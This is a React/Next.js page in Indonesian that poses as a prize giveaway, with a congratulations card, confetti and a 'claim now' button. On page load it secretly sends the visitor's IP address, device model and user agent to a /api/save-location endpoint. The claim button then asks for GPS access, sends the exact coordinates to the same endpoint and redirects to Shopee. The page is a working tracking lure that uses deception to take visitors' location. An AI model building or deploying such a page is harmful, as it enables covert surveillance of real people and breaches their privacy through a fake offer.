"use client";

import { useEffect } from "react";
import confetti from "canvas-confetti";

export default function TrackPage() {
  useEffect(() => {
    async function run() {
      try {
        const ipRes = await fetch("/api/get-ip");
        const ipData = await ipRes.json();

        const deviceInfo = getDeviceInfo();

        await fetch("/api/save-location", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            device: deviceInfo.device,
            userAgent: deviceInfo.ua,
            ip: ipData.ip,
            gpsLat: null,
            gpsLon: null,
          }),
        });
      } catch (err) {
        console.log(err);
      }
    }

    run();

    setTimeout(() => {
      confetti({
        particleCount: 160,
        spread: 80,
        origin: { y: 0.6 },
      });
    }, 500);
  }, []);

  async function handleClaim() {
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          await fetch("/api/save-location", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              gpsLat: pos.coords.latitude,
              gpsLon: pos.coords.longitude,
            }),
          });

          confetti({
            particleCount: 200,
            spread: 100,
            origin: { y: 0.7 },
          });

          // Redirect ke Shopee
          window.location.href = "https://shopee.co.id";
        },
        () => {
          window.location.href = "https://shopee.co.id";
        }
      );
    } else {
      window.location.href = "https://shopee.co.id";
    }
  }

  return (
    <div style={styles.container}>
      <div style={styles.card}>
        <h2 style={styles.title}>🎉 SELAMAT!</h2>
        <p style={styles.text}>
          Anda mendapatkan kesempatan hadiah menarik hari ini!
        </p>
        <p style={styles.text}>Klik tombol di bawah untuk klaim hadiah Anda.</p>

        <button style={styles.button} onClick={handleClaim}>
          🎁 KLAIM SEKARANG
        </button>
      </div>
    </div>
  );
}

function getDeviceInfo() {
  const ua =
    typeof navigator !== "undefined" ? navigator.userAgent : "unknown";

  const devices = [
    "iPhone",
    "iPad",
    "Samsung",
    "Xiaomi",
    "OPPO",
    "Vivo",
    "Realme",
    "Huawei",
    "Infinix",
    "Poco",
    "Sony",
    "Nokia",
    "Asus",
    "Lenovo",
    "Motorola",
    "Google Pixel",
    "TECNO",
  ];

  let detected = "Unknown Device";
  for (const d of devices) {
    if (ua.toLowerCase().includes(d.toLowerCase())) detected = d;
  }

  if (detected === "Unknown Device" && /Android/i.test(ua))
    detected = "Android Phone";

  return { device: detected, ua };
}

const styles = {
  container: {
    minHeight: "100vh",
    background: "#ffefe0",
    display: "flex",
    justifyContent: "center",
    alignItems: "center",
    padding: 20,
  },
  card: {
    background: "white",
    padding: "30px 25px",
    borderRadius: 15,
    boxShadow: "0 6px 20px rgba(0,0,0,0.15)",
    textAlign: "center",
    maxWidth: 360,
    width: "100%",
    animation: "fadeIn 0.8s ease-out",
  },
  title: {
    margin: "0 0 10px 0",
    fontSize: "28px",
    fontWeight: "bold",
  },
  text: {
    fontSize: "16px",
    marginBottom: 12,
  },
  button: {
    background: "#ff5722",
    padding: "14px 20px",
    width: "100%",
    border: "none",
    borderRadius: 10,
    color: "white",
    fontSize: "18px",
    cursor: "pointer",
    marginTop: 20,
    fontWeight: "bold",
    transition: "0.2s",
  },
} as const;
